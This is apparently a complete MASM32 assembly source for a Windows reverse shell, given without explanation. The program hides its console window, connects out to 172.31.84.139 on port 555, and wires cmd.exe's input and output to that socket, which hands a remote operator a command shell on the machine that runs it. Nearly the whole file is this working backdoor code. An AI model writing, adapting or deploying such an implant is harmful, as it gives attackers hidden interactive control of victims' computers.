.386 ; instruction game for the 80386 processor
.model flat, stdcall ; set memory model in flat with calling convention stdcall
option casemap : none ; Forces your labels to be case sensitive, which means Hello and hello are treated differently

; Include headers file
include \masm32\include\windows.inc ; include windows headers
include \masm32\include\kernel32.inc ; include kernel32 headers
include \masm32\include\masm32.inc ; include masm32 headers
include \masm32\include\ws2_32.inc ; include socket library

; Include library
includelib \masm32\lib\kernel32.lib ; include kernel32 library
includelib \masm32\lib\masm32.lib ; include masm32 library
includelib \masm32\lib\ws2_32.lib ; include ws2_32.library

.data?
    wsa WSADATA  <?>
    socks sockaddr_in <?>
    pinfo PROCESS_INFORMATION <?>
    sinfo STARTUPINFOA <?>
    fd dd ?

.data
    rip db "172.31.84.139", 0
    process db "cmd.exe", 0

.code
_start: ; main label
    call FreeConsole ; for hide console
    jmp _wsockstartup
    test eax, eax
    jz _check_version_winsock

_wsockstartup:
    push offset wsa ; invoke WSAStartup, 002h, addr wsa
    push 0002h ; MAKEWORD(2,2);
    call WSAStartup ; call WSAStartup


_check_version_winsock:
    cmp byte ptr [wsa.wVersion], 2h
    jae _init_socket ; jump >= 0x2
    jmp _wsockcleanup

_init_socket:
    push 0h
    push 0h
    push 0h
    push 6h ; IPPROTO_TCP
    push 1h ; SOCK_STREAM
    push 2h ; AF_INET
    call WSASocketA ; call WSASocketA
    cmp eax, INVALID_SOCKET
    jne _socket_created

_socket_created:
    mov [fd], eax
    jmp _init_sockaddr_in

_init_sockaddr_in:
    mov [socks.sin_family], AF_INET
    push 555d ; Port Number
    call htons
    mov [socks.sin_port], ax
    push offset rip
    call inet_addr
    mov [socks.sin_addr.S_un.S_addr], eax
    jmp _try_connect

_try_connect:
    push sizeof socks
    push offset socks
    push [fd]
    call connect
    cmp eax, 0h
    jz _handle_connection
    jmp _socket_close


_handle_connection:
    mov eax, fd
    mov sinfo.hStdInput, eax
    mov sinfo.hStdOutput, eax
    mov sinfo.hStdError, eax
    mov sinfo.cb, sizeof STARTUPINFO
    mov sinfo.dwFlags, STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
    push offset pinfo
    push offset sinfo
    push NULL
    push NULL
    push 0
    push TRUE
    push NULL
    push NULL
    push offset process
    push NULL
    call CreateProcessA ; invoke CreateProcess, NULL, addr process, NULL, NULL, TRUE, 0, NULL, NULL, addr sinfo, addr pinfo
    cmp eax, 1h
    jz _success_create_process
    jnz _socket_close

_success_create_process:
    push INFINITE
    push pinfo.hProcess
    call WaitForSingleObject ;invoke WaitForSingleObject, pinfo.hProcess, INFINITE
    call CloseHandle
    push pinfo.hThread
    call CloseHandle
    jmp _socket_close

_socket_close:

    push fd
    call closesocket
    cmp eax, 0h
    jz _wsockcleanup

_wsockcleanup:
    call WSACleanup
    test eax, eax
    jz _exit

_exit:
    push 0h
    call ExitProcess

end _start